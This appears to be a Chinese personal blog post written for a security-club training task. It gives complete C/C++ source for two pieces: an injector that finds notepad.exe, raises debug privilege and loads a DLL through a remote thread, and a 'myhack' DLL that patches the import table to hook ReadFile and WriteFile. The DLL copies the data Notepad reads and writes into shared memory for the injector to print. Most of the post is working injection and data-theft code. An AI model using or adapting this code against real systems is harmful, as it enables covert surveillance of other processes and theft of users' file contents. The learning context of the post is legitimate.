---
title: DLL注入实践
date: 2019-10-23 17:15:36
tags: [逆向,DLL]
categories: 网络安全
---

网安组新人任务Week3实践内容
<!--more--> 

## 实践任务
* 使用C编写一段代码,使用Dll注入的方法, 窃取你的系统中的32位notepad.exe(记事本)的保存和读取的文件内容

### 具体要求
* 打开注入器, 它能够自动寻找notepad.exe进程,发现一个记事本进程之后将恶意Dll注入该进程中
* 该进程进行了文件读写之后, Dll将内容窃取(但不拦截), 并交给注入器, 注入器将相关内容输出在控制台中
* 需要编写两份代码,一份为Dll(被注入的代码),一份为Dll注入器(也作为主控, 输出得到的信息)推荐远程线程注入的方法注入DLL!

### 实践思路
#### Dll注入器
* DLL注入部分在上一篇博客[DLL注入](https://liuyi12138.github.io/2019/10/21/DLL%E6%B3%A8%E5%85%A5/)实现
* 利用Windows的API可以实现根据进程名称自动获取进程PID
* 进程间的通信采用共享内存的方式实现

#### Dll文件
* 注入DLL后采用IAT钩取的方式将IAT中WriteFile()和ReadFile函数的RVA替换成自己构建的函数地址，由此可在系统调用文件读写函数的时候获取到用户进行文件读写的信息
* WriteFile()和ReadFile函数在"kernel32.dll"中，但我的win10上的notepad.exe导入表中并没有"kernel32.dll"，猜测是win10防止攻击的一种措施,所以我在虚拟机中运行此程序
* 除了IAT钩取使用调试器的方式也能完成此实践，两种方法可分别参考博客[[dll注入实现IAT勾取] 计算器显示中文](https://www.cnblogs.com/hanhandaren/p/11499073.html)和[[记事本API Hook] 调试器 勾取 WriteFile()Api](https://www.cnblogs.com/hanhandaren/p/11498129.html)


### 代码编写
* DLL注入程序InjectDll

```c++
#include <windows.h>
#include <stdio.h>
#include <Tlhelp32.h>

BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnable);
BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath);
DWORD ProcessNameToPID(char* Name);
#define BUF_SIZE 4096

int main(int argc, char* argv[])
{
    if(argc != 3){
        printf("input error, Usage: %s <pid> <dll_path>", argv[0]);
        return 1;
    }
    DWORD pid = ProcessNameToPID(argv[1]);
    printf("PID: %d\n", pid);

    //change privilege
    if(!SetPrivilege(SE_DEBUG_NAME, true))
        return 1;

    char szBuffer[BUF_SIZE] = {0};
    char szBufferLast[BUF_SIZE] = {0};
    //inject dll
    while(1){
        pid = ProcessNameToPID(argv[1]);
        if(pid != 0 && InjectDll((DWORD)pid, (LPCTSTR)argv[2])){
            printf("InjectDll(\"%s\") success!!!\n", argv[2]);
            // 定义共享数据

            // 创建共享文件句柄
            HANDLE hMapFile = CreateFileMapping(
                INVALID_HANDLE_VALUE,   // 物理文件句柄
                NULL,   // 默认安全级别
                PAGE_READWRITE,   // 可读可写
                0,   // 高位文件大小
                BUF_SIZE,   // 地位文件大小
                "myhack"   // 共享内存名称
                );

            // 映射缓存区视图 , 得到指向共享内存的指针
            LPVOID lpBase = MapViewOfFile(
                hMapFile,            // 共享内存的句柄
                FILE_MAP_ALL_ACCESS, // 可读写许可
                0,
                0,
                BUF_SIZE
                );

            while(1){
                //缓存上一次的数据
                strcpy(szBufferLast,szBuffer);
                // 将共享内存数据拷贝出来
                strcpy(szBuffer,(char*)lpBase);
                if(strcmp(szBuffer, szBufferLast)){
                    printf("%s",szBuffer);
                }
                Sleep(200);
            }
        }
        else{
            printf("Waiting for (\"%s\")\n", argv[1]);
        }
        Sleep(200);
    }

    return 0;
}

BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath){
    HANDLE hProcess = NULL, hThread = NULL;
    HMODULE hMod = NULL;
    LPVOID pRemoteBuf = NULL;
    DWORD dwBufSize = (DWORD)(strlen(szDllPath) + 1) * sizeof(char);
    LPTHREAD_START_ROUTINE pThreadProc;

    //获取目标进程句柄，获取PROCESS_ALL_ACCESS权限
    if(!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )
    {
        //printf("OpenProcess(%d) failed!!! [%d]\n", dwPID, GetLastError());
        return FALSE;
    }

    //将注入的DLL路径写入目标进程内存
    //在指定进程的虚拟空间保留或提交内存区域
    pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);

    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);

    hMod = GetModuleHandle("kernel32.dll");

    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, "LoadLibraryA");

    //创建远程线程
    hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}


BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnable) {
    OutputDebugString(lpszPrivilege);
    BOOL bRet = FALSE;
    HANDLE hToken = NULL;
    HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, ::GetCurrentProcessId());
    if (!::OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &hToken))
    {
        goto __EXIT;
    }
    LUID Luid;
    if (!::LookupPrivilegeValue(NULL, lpszPrivilege, &Luid))
    {
        goto __EXIT;
    }
    TOKEN_PRIVILEGES newPrivilege;
    newPrivilege.PrivilegeCount = 1;
    newPrivilege.Privileges[0].Luid = Luid;
    newPrivilege.Privileges[0].Attributes = //设置特权属性
               bEnable ?
               SE_PRIVILEGE_ENABLED :
               SE_PRIVILEGE_ENABLED_BY_DEFAULT;
    if (!::AdjustTokenPrivileges(hToken, FALSE, &newPrivilege,
        sizeof(TOKEN_PRIVILEGES), NULL, NULL))
    {
        TCHAR s[64] = { 0 };
        //printf("AdjustTokenPrivileges error: %d\n",GetLastError());
        OutputDebugString(s);
        goto __EXIT;
    }
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)//查看是否真的设置成功了
    {
        printf("The token does not have the specified privilege. \n");
        goto __EXIT;
    }
    bRet = TRUE;
    printf("Set OK\n");
__EXIT:
    if (hProcess)
    {
        ::CloseHandle(hProcess);
    }
    if (hToken)
    {
        ::CloseHandle(hToken);
    }
    return bRet;
}

DWORD ProcessNameToPID(char* Name){

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(hSnapshot == INVALID_HANDLE_VALUE){
        printf("Create Snapshot failed");
        return 1;
    }
    PROCESSENTRY32 pi;
    pi.dwSize = sizeof(PROCESSENTRY32);
    BOOL bRet = Process32First(hSnapshot,&pi);
    while(bRet){
        if(strcmp(pi.szExeFile, Name) == 0){
            return pi.th32ProcessID;
        }
        else{
            bRet = Process32Next(hSnapshot,&pi);
        }
    }
    return 0;

}


```

* DLL程序myhack

```c++
#include "windows.h"
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>

BOOL HookIAT(LPCSTR szDllName, PROC pfnOrg, PROC pfnNew);
BOOL WINAPI HookedReadFile(
    HANDLE hFile,       //文件的句柄
     LPVOID lpBuffer,    //用于保存读入数据的一个缓冲区
     DWORD nNumberOfBytesToRead,     //要读入的字节数
     LPDWORD lpNumberOfBytesRead,   //指向实际读取字节数的指针
     LPOVERLAPPED lpOverlapped
);
BOOL WINAPI HookedWriteFile(
HANDLE  hFile,//文件句柄
LPCVOID lpBuffer,//数据缓存区指针
DWORD   nNumberOfBytesToWrite,//要写的字节数
LPDWORD lpNumberOfBytesWritten,//用于保存实际写入字节数的存储区域的指针
LPOVERLAPPED lpOverlapped//OVERLAPPED结构体指针
);

typedef BOOL (WINAPI *PFSETWINDOWTEXTW)(HWND hWnd, LPWSTR lpString);
#define BUF_SIZE 4096

LPVOID g_readProc = NULL;
LPVOID g_writeProc = NULL;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch( fdwReason )
    {
    case DLL_PROCESS_ATTACH :

        g_readProc = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "ReadFile");
        g_writeProc = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "WriteFile");
        if (g_readProc) {
            HookIAT("kernel32.dll", (PROC)g_readProc, (PROC)HookedReadFile);
            HookIAT("kernel32.dll", (PROC)g_writeProc, (PROC)HookedWriteFile);
        }
        break;
    case DLL_PROCESS_DETACH:
        //HookIAT("kernel32.dll", (PROC)HookedReadFile, (PROC)g_readProc);
        //HookIAT("kernel32.dll", (PROC)HookedWriteFile, g_writeProc);
    break;
    }

    return TRUE;
}

BOOL WINAPI HookedReadFile(
    HANDLE hFile,       //文件的句柄
    LPVOID lpBuffer,    //用于保存读入数据的一个缓冲区
    DWORD nNumberOfBytesToRead,     //要读入的字节数
    LPDWORD lpNumberOfBytesRead,   //指向实际读取字节数的指针
    LPOVERLAPPED lpOverlapped
){
    int status = ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);
    HANDLE hMapFile = OpenFileMapping(FILE_MAP_ALL_ACCESS,NULL,"myhack");
    if(hMapFile){
        LPVOID lpBase = MapViewOfFile(hMapFile,FILE_MAP_ALL_ACCESS,0,0,0);
        char szBuffer[BUF_SIZE] = "ReadFile:    ";
        strncat(szBuffer, (char*)lpBuffer, (*lpNumberOfBytesRead));
        strcat(szBuffer, "\n");
        //写入数据
        strcpy((char*)lpBase,szBuffer);
        // 解除文件映射
        UnmapViewOfFile(lpBase);
        // 关闭内存映射文件对象句柄
        CloseHandle(hMapFile);
    }
    return status;
}

BOOL WINAPI HookedWriteFile(
    HANDLE  hFile,//文件句柄
    LPCVOID lpBuffer,//数据缓存区指针
    DWORD   nNumberOfBytesToWrite,//要写的字节数
    LPDWORD lpNumberOfBytesWritten,//用于保存实际写入字节数的存储区域的指针
    LPOVERLAPPED lpOverlapped//OVERLAPPED结构体指针
) {
    HANDLE hMapFile = OpenFileMapping(FILE_MAP_ALL_ACCESS,NULL,"myhack");
    if(hMapFile){
        LPVOID lpBase = MapViewOfFile(hMapFile,FILE_MAP_ALL_ACCESS,0,0,0);
        char szBuffer[BUF_SIZE] = "WriteFile:   ";
        strncat(szBuffer, (char*)lpBuffer, nNumberOfBytesToWrite);
        strcat(szBuffer, "\n");
        //写入数据
        strcpy((char*)lpBase,szBuffer);
        // 解除文件映射
        UnmapViewOfFile(lpBase);
        // 关闭内存映射文件对象句柄
        CloseHandle(hMapFile);
    }
    return WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
}


//   负责iat的勾取
BOOL HookIAT(LPCSTR szDllName, PROC pfnOrg, PROC pfnNew)
{
    HMODULE hMod;
    LPCSTR szLibName;
    PIMAGE_IMPORT_DESCRIPTOR pImportDesc;
    PIMAGE_THUNK_DATA pThunk;
    DWORD dwOldProtect, dwRVA;
    PBYTE pAddr;
    //*首先进行PE文件头信息的读取*/
    // hMod, pAddr = ImageBase of notepad.exe
    //             = VA to MZ signature (IMAGE_DOS_HEADER)
    hMod = GetModuleHandle(NULL);
    pAddr = (PBYTE)hMod;
    // pAddr = VA to PE signature (IMAGE_NT_HEADERS)
    pAddr += *((DWORD*)&pAddr[0x3C]);

    // dwRVA = RVA to IMAGE_IMPORT_DESCRIPTOR Table
    dwRVA = *((DWORD*)&pAddr[0x80]);

    // pImportDesc = VA to IMAGE_IMPORT_DESCRIPTOR Table 如果想要找到IAT首先要找到导入表对应的位置
    pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA);
    /*通过循环来比较找到kernel32.dll中的导入表结构*/

    for( ; pImportDesc->Name; pImportDesc++ )
    {
        // szLibName = VA to IMAGE_IMPORT_DESCRIPTOR.Name
        szLibName = (LPCSTR)((DWORD)hMod + pImportDesc->Name);
        if( !_stricmp(szLibName, szDllName) )
        {
            // pThunk = IMAGE_IMPORT_DESCRIPTOR.FirstThunk
            //        = VA to IAT(Import Address Table)
            pThunk = (PIMAGE_THUNK_DATA)((DWORD)hMod +
                                         pImportDesc->FirstThunk);

            // pThunk->u1.Function = VA to API
            for( ; pThunk->u1.Function; pThunk++ )
            {
                if( pThunk->u1.Function == (DWORD)pfnOrg )
                {
                    // 更改内存属性为E/R/W
                    //由于计算器原有IAT内存区域是只可读的
                    //所以勾取之前通过VirtualProtect函数将相应的IAT的内存区域更改为可读写模式
                    bool a = VirtualProtect((LPVOID)&pThunk->u1.Function,   // 目标地址起始位置
                                   4,                              // 大小
                                   PAGE_EXECUTE_READWRITE,         // 请求的保护方式 区域包含可执行代码，应用程序可以读写该区域。
                                   &dwOldProtect);                 // 保存老的保护方式

                    //修改IAT值（勾取）把原有指向user32.dll/Setwindowtext的值指向我们自己的函数MySetWindowTextW
                    pThunk->u1.Function = (DWORD)pfnNew;
                    // 恢复内存属性
                    VirtualProtect((LPVOID)&pThunk->u1.Function,
                                   4,
                                   dwOldProtect,
                                   &dwOldProtect);
                    return TRUE;
                }
            }
        }
    }
    return FALSE;
}

```

### 实践效果
* 运行该程序需要用管理员身份运行，否则会提权失败

![20191028164535](https://gitee.com/know_the_emperor/picture/raw/master/pictures/20191028164535.png)